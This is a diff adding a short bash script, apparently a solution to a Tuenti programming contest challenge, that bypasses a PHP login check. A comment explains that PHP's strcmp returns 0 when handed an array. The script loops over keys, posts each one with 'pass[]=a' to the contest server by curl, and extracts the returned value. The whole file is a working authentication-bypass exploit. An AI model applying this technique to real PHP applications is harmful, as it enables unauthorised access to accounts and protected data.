@@ -1,0 +1,10 @@
+#!/bin/bash
+
+# PHP's strcmp(param1, param2) triggers a warning and returns 0 when one of the
+#  parameters is not a string ($_POST["pass"] is an array here <$pass[]=a>)
+
+while read key
+do
+    my_key=`curl -s --data "key=$key&pass[]=a" http://pauth.contest.tuenti.net/`
+    echo $my_key | cut -d ' ' -f 4
+done
